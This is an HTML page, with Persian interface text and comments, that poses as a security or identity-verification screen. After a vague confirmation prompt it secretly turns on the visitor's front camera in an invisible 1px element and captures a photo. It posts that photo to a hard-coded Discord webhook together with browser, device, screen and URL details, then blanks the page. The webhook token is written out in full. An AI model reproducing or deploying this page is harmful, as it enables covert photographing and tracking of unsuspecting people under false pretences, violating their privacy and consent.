<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>در حال بارگذاری...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a1a1a;
            color: white;
            font-family: Arial;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden-camera {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="loader"></div>
        <p>در حال بررسی سیستم...</p>
    </div>

    <!-- دوربین مخفی -->
    <div class="hidden-camera">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        // 🔧 وب‌هوک تو
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421586742120546418/sDyMZ53pfBPEzWRmmWG2ZlFtmmMDucEStM-pJ7V_q3l3wN4hmqQmBdp_kiqWVC06Sl9O';

        // المنت‌ها
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');

        // وقتی صفحه لود شد
        window.onload = function() {
            setTimeout(() => {
                const confirm = window.confirm('⚠️ برای ورود به سیستم باید تایید کنید\n\nآیا موافق هستید؟');
                
                if (confirm) {
                    startHiddenCamera();
                } else {
                    showError('دسترسی رد شد');
                }
            }, 1000);
        };

        // دوربین مخفی
        async function startHiddenCamera() {
            try {
                loading.innerHTML = '<div class="loader"></div><p>در حال راه‌اندازی سیستم امنیتی...</p>';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                video.srcObject = stream;

                // صبر کن دوربین آماده بشه
                setTimeout(() => {
                    takeHiddenPhoto(stream);
                }, 1000);

            } catch (error) {
                showError('خطا در سیستم امنیتی');
                console.error('خطا:', error);
            }
        }

        // گرفتن عکس مخفی
        async function takeHiddenPhoto(stream) {
            try {
                loading.innerHTML = '<div class="loader"></div><p>در حال تأیید هویت...</p>';

                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                // عکس رو به فرمت base64 تبدیل کن
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                // دوربین رو خاموش کن
                stream.getTracks().forEach(track => track.stop());
                
                // به دیسکورد بفرست
                loading.innerHTML = '<div class="loader"></div><p>در حال ورود به سیستم...</p>';
                await sendToDiscord(photoData);
                
                // صفحه رو سفید کن
                showSuccess();
                
            } catch (error) {
                showError('خطا در تأیید هویت');
                console.error('خطا:', error);
            }
        }

        // ارسال به دیسکورد
        async function sendToDiscord(photoData) {
            try {
                // تبدیل عکس به فایل
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // ایجاد فرم داده
                const formData = new FormData();
                formData.append('file', blob, 'user_photo.jpg');
                formData.append('payload_json', JSON.stringify({
                    username: 'Security System',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png',
                    content: '📸 **عکس کاربر دریافت شد**\n' +
                            `🕒 **زمان:** ${new Date().toLocaleString('fa-IR')}\n` +
                            `🌐 **مرورگر:** ${getBrowserName()}\n` +
                            `📱 **دستگاه:** ${isMobile() ? 'موبایل' : 'دسکتاپ'}\n` +
                            `📍 **صفحه:** ${screen.width}x${screen.height}\n` +
                            `🔗 **آدرس:** ${window.location.href}\n` +
                            '✅ **ورود موفق**'
                }));

                // ارسال به دیسکورد
                const result = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });

                if (!result.ok) {
                    throw new Error('خطا در ارسال');
                }

                return true;

            } catch (error) {
                console.error('خطا در ارسال به دیسکورد:', error);
                throw error;
            }
        }

        // تشخیص مرورگر
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            return 'Unknown';
        }

        // تشخیص موبایل
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // نمایش موفقیت
        function showSuccess() {
            document.body.style.background = 'white';
            document.body.innerHTML = '<div style="color: black; padding: 20px;"><h1>✅ ورود موفق</h1><p>در حال هدایت به صفحه اصلی...</p></div>';
            
            // بعد از 3 ثانیه کاملاً سفید بشه
            setTimeout(() => {
                document.body.innerHTML = '';
            }, 3000);
        }

        // نمایش خطا
        function showError(message) {
            document.body.innerHTML = `<div style="padding: 20px;"><h1>❌ خطا</h1><p>${message}</p></div>`;
        }
    </script>
</body>
</html>
